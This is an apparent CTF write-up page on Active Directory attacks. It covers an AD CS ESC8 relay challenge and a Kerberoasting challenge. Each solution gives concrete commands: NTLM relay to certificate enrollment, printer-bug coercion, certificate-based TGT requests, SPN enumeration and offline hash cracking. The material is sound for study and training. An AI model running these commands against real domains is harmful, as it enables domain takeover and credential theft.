---
layout: page
title: Active Directory Attacks
subtitle: Active Directory and network-level attack writeups by event and year
permalink: /ctf/challenges/active-directory/
---

<p class="page-lead">Active Directory, LDAP, Kerberos, and internal network hacking writeups from global enterprise CTFs and ProLabs. Organized by year and event.</p>

<div class="challenge-year-nav">
  <button class="mf-btn active" data-filter="all">All Years</button>
  <button class="mf-btn" data-filter="2025">2025</button>
  <button class="mf-btn" data-filter="2024">2024</button>
</div>

---

## 2025 Challenges

### HTB Cyber Apocalypse 2025

<div class="challenge-cards-list">

  <div class="challenge-card" data-year="2025" data-event="htb">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge htb">HTB Cyber Apocalypse 2025</span>
        <h4 class="cc-name">ESC-Relay</h4>
      </div>
      <span class="cc-diff hard">Hard</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Active Directory · <strong>Points</strong>: 480 · <strong>Solves</strong>: 34</p>
      <p class="cc-desc">Exploit AD CS ESC8 vulnerability. Coerce HTTP NTLM authentication from a domain controller using MS-RPRN Printer Bug, and relay it to the AD CS Web Enrollment endpoint to request a Domain Admin certificate.</p>
      <div class="cc-tags"><span>AD CS</span><span>ESC8</span><span>NTLM Relaying</span><span>Printer Bug</span><span>Coercion</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <p>1. Start NTLM relaying tool listening on HTTP and targeting the AD CS web enrollment page: <code>ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</code>.</p>
          <p>2. Coerce authentication from the target DC (<code>DC-01</code>) using the printer bug: <code>dementor.py 10.10.10.5 10.10.10.10</code> (relaying listener is at 10.10.10.5, DC is at 10.10.10.10).</p>
          <p>3. Capture the relayed connection from the DC, request the certificate, and download the base64-encoded PFX certificate.</p>
          <p>4. Request a TGT ticket using the certificate to assume DC authority: <code>certipy auth -pfx dc-01.pfx -dc-ip 10.10.10.10</code>.</p>
        </div>
      </details>
    </div>
  </div>

</div>

### DEF CON 2024 Quals

<div class="challenge-cards-list">

  <div class="challenge-card" data-year="2024" data-event="defcon">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge defcon">DEF CON 2024 Quals</span>
        <h4 class="cc-name">Kerberoast-Showdown</h4>
      </div>
      <span class="cc-diff medium">Medium</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Active Directory · <strong>Points</strong>: 300 · <strong>Solves</strong>: 110</p>
      <p class="cc-desc">Read Active Directory SPNs without domain credentials by abusing unauthenticated LDAP queries, then execute Kerberoasting against target service accounts.</p>
      <div class="cc-tags"><span>Kerberoasting</span><span>LDAP Query</span><span>SPN</span><span>Impacket</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <p>1. Use anonymous LDAP search queries to find SPNs: <code>ldapsearch -x -h 10.10.12.3 -b "dc=corp,dc=local" "(servicePrincipalName=*)" spn</code>.</p>
          <p>2. Request Kerberos TGS tickets for identified accounts: <code>GetUserSPNs.py corp.local/guest:password -dc-ip 10.10.12.3 -request</code>.</p>
          <p>3. Export the ticket hashes to a local file and crack offline using hashcat mode 13100.</p>
        </div>
      </details>
    </div>
  </div>

</div>
